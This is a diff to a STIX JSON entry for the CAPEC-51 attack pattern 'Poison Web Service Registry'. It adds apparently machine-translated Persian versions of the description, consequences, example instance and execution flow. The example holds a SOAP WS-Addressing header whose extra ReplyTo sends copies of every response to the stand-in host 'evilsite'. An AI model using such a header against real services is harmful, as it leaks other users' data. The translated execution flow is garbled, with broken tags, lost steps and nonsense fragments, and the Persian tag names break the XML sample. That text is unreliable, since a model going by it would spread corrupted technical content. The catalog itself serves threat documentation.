@@ -9,22 +9,26 @@
                 {
                     "external_id": "CAPEC-51",
                     "source_name": "capec",
-                    "url": "https://capec.mitre.org/data/definitions/51.html"
+                    "url": "https://capec.mitre.org/data/definitions/51.html",
+                    "source_name_fa": "capec"
                 },
                 {
                     "external_id": "CWE-285",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/285.html"
+                    "url": "http://cwe.mitre.org/data/definitions/285.html",
+                    "source_name_fa": "cwe"
                 },
                 {
                     "external_id": "CWE-74",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/74.html"
+                    "url": "http://cwe.mitre.org/data/definitions/74.html",
+                    "source_name_fa": "cwe"
                 },
                 {
                     "external_id": "CWE-693",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/693.html"
+                    "url": "http://cwe.mitre.org/data/definitions/693.html",
+                    "source_name_fa": "cwe"
                 }
             ],
             "id": "attack-pattern--943fa8f4-b777-4f3c-984b-9f620e50c70b",
@@ -49,6 +53,17 @@
                 "Integrity": [
                     "Execute Unauthorized Commands (Run Arbitrary Code)",
                     "Modify Data"
+                ],
+                "Availability_fa": [
+                    "اجرای دستورات غیرمجاز (اجرای کد دلخواه)"
+                ],
+                "Confidentiality_fa": [
+                    "اجرای دستورات غیرمجاز (اجرای کد دلخواه)",
+                    "داده ها را بخوانید"
+                ],
+                "Integrity_fa": [
+                    "اجرای دستورات غیرمجاز (اجرای کد دلخواه)",
+                    "داده ها را اصلاح کنید"
                 ]
             },
             "x_capec_domains": [
@@ -67,11 +82,25 @@
                 "Capability to directly or indirectly modify registry resources"
             ],
             "x_capec_skills_required": {
-                "Low": "To identify and execute against an over-privileged system interface"
+                "Low": "To identify and execute against an over-privileged system interface",
+                "Low_fa": "برای شناسایی و اجرا در برابر یک رابط سیستم بیش از حد مجاز"
             },
             "x_capec_status": "Draft",
             "x_capec_typical_severity": "Very High",
-            "x_capec_version": "3.9"
+            "x_capec_version": "3.9",
+            "description_fa": "SOA و خدمات وب اغلب از یک رجیستری برای جستجو، دریافت اطلاعات طرحواره و ابرداده در مورد خدمات استفاده می کنند. یک رجیستری مسموم می تواند درخواست کننده سرویس را به یک ارائه دهنده سرویس مخرب هدایت کند (به فکر فیشینگ برای سرورها باشد)، اطلاعات نادرستی را در طرحواره یا ابرداده ارائه دهد و اطلاعات مربوط به رابط های ارائه دهنده خدمات را حذف کند.",
+            "name_fa": "Poison Web Service Registry",
+            "x_capec_example_instances_fa": [
+                "<xhtml:p>WS-Addressing موقعیت مکانی و ابرداده‌های مربوط به نقاط پایانی سرویس را ارائه می‌دهد. شناسایی حمله بسیار سخت، مهاجمی است که هدر WS-Addressing را به روز می کند، درخواست سرویس استاندارد و آدرس دهی ارائه دهنده سرویس و اطلاعات هدر را دست نخورده باقی می گذارد، اما یک هدر WS-Addressing Replyto اضافه می کند. در این حالت مهاجم می تواند یک کپی (مانند یک سی سی در نامه) از هر نتیجه ای که ارائه دهنده خدمات ایجاد می کند ارسال کند. بنابراین هر پرس و جو به سرویس حساب بانکی، یک پیام پاسخ از وضعیت تراکنش به درخواست کننده خدمات مجاز و سرویس مهاجم ایجاد می کند. تشخیص این امر در زمان اجرا بسیار سخت خواهد بود.</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\"><S:Header><xhtml:div style=\"margin-left:1em;\"><wsa:MessageID><xhtml:div style=\"margin-left:1em;\">http://example.com/Message</xhtml:div>\n                     </wsa:MessageID><wsa:ReplyTo><xhtml:div style=\"margin-left:1em;\"><wsa:آدرس>http://valid.example/validClient</wsa:Address></xhtml:div>\n                     </wsa:ReplyTo><wsa:ReplyTo><xhtml:div style=\"margin-left:1em;\"><wsa:آدرس>http://evilsite/evilClient</wsa:Address></xhtml:div>\n                     </wsa:ReplyTo><wsa:FaultTo><xhtml:div style=\"margin-left:1em;\"><wsa:آدرس>http://validfaults.example/ErrorHandler</wsa:Address></xhtml:div>\n                     </wsa:FaultTo></xhtml:div>\n                  </S:Header></xhtml:div>\n               <xhtml:p>در این مثال \"evilsite\" یک پاسخ اضافی به آدرس با دسترسی کامل به تمام پیام هایی است که مجاز (validClient) به آنها دسترسی دارد. از آنجایی که این با هدر ReplyTo ثبت شده است، خطای Soap ایجاد نمی کند.</xhtml:p>"
+            ],
+            "x_capec_execution_flow_fa": "<h2> جریان اجرا </h2><div><h3>کاوش</h3><ol><li> <p> <b>یافتن یک SOA یا سرویس وب هدف: </b>دشمن ابتدا باید یک SOA یا وب سرویس مورد نظر را شناسایی کند.</p></li></ol></div><div><h3>Experiment<b><h3>Description نتیجه: </b>از آنجایی که مسموم کردن رجیستری وب سرویس می‌تواند نتایج متفاوتی داشته باشد، حریف باید تصمیم بگیرد که چگونه می‌خواهد سرویس وب را تحت تأثیر قرار دهد.</p></li><table><tbody><tr><th>تکنیک‌ها</th></tr><tr><td>یک حریف می‌تواند یک حمله انکار سرویس را روی یک وب سرویس انجام دهد><d><d><d redirect request/trnt. پاسخ به یک سرویس مخرب.</td></tr></tbody></table><li> <p> <b>تعیین کنید که آیا یک سرویس مخرب باید ایجاد شود: </b>اگر دشمن بخواهد درخواست‌ها یا پاسخ‌ها را تغییر مسیر دهد، باید یک سرویس مخرب ایجاد کند تا به آن هدایت شود. درخواست‌ها علاوه بر سرویس قانونی به آن ارسال می‌شوند و به سادگی درخواست‌ها را ثبت می‌کنند.</td></tr><tr><td>یک سرویس ایجاد کنید که پاسخ‌های مخرب به ارائه‌دهنده سرویس بدهد.</td></tr><tr><td>به عنوان یک ارائه‌دهنده سرویس مخرب عمل کنید و به درخواست‌ها به صورت دلخواه پاسخ دهید. راه.</td></tr></tbody></table></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>Poison Web Service Registry: </b>بر اساس نتیجه دلخواه، رجیستری وب سرویس را مسموم کنید. این کار با تغییر داده‌ها در حالت استراحت در رجیستری یا آپلود محتوای مخرب با جعل ارائه‌دهنده خدمات انجام می‌شود.</p></li><table><tbody><tr><th>تکنیک‌ها</th></tr><tr><td>سربرگ‌های آدرس‌دهی WS را برای مسیریابی به یک سرویس یا ارائه‌دهنده سرویس مخرب تغییر داده و تغییر می‌دهند. ابرداده‌ها باعث انکار سرویس می‌شوند.</td></tr><tr><td>اطلاعات مربوط به رابط‌های ارائه‌دهنده سرویس را حذف کنید تا باعث انکار سرویس شود.</td></tr></tbody></table></ol></div>",
+            "x_capec_extended_description_fa": "<xhtml:p> آدرس‌دهی WS برای مجازی‌سازی سرویس‌ها، ارائه آدرس‌های برگشتی و سایر اطلاعات مسیریابی استفاده می‌شود، اما، مگر اینکه هدرهای آدرس‌دهی WS محافظت شوند، در معرض بازنویسی هستند. محتوای موجود در رجیستری توسط ارائه دهنده خدمات مستقر می شود. رجیستری در یک سیستم SOA یا خدمات وب می تواند توسط درخواست کننده سرویس از طریق UDDI یا پروتکل های دیگر قابل دسترسی باشد.</xhtml:p>",
+            "x_capec_prerequisites_fa": [
+                "مهاجم باید قادر به نوشتن در منابع یا تغییر مسیر دسترسی به رجیستری سرویس باشد."
+            ],
+            "x_capec_resources_required_fa": [
+                "قابلیت تغییر مستقیم یا غیرمستقیم منابع رجیستری"
+            ]
         }
     ],
     "spec_version": "2.0",
